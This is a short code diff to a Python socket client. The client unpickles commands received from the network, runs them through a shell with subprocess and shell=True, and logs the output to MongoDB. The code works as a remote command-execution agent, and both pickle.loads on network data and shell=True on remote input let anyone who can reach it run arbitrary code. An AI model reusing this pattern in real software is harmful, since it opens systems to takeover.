@@ -2,10 +2,10 @@
 
 import socket
 import pickle
-import os
 import pymongo
+import subprocess
 
-# 127.0.0.1:27017
+
 myclient = pymongo.MongoClient("mongodb://localhost:27017/")
 mydb = myclient["test_h"]
 mycol = mydb["data"]
@@ -38,9 +38,19 @@ while True:
 			print("full msg received")
 			msg_got = pickle.loads(full_msg[HEADERSIZE:])
 			print("command got : ", msg_got)
-			x = os.popen(msg_got).read()
-			print(x)
-			to_db = mycol.insert_one({"data": x})
+			# x = os.popen(msg_got).read()
+			# print(x)
+			try:
+				do_command = subprocess.check_output(msg_got, shell=True)
+				print(do_command)
+				if len(do_command.decode()) >= 1:
+					to_db = mycol.insert_one({"data": do_command.decode(), "code": 0})
+				else:
+					to_db = mycol.insert_one({"data": "command has no shown value", "code": 0})
+
+			except:
+				to_db = mycol.insert_one({"data": "failed command", "code": 0})
+
 			print("number of packets got : ", count)
 			count = 0
 			break
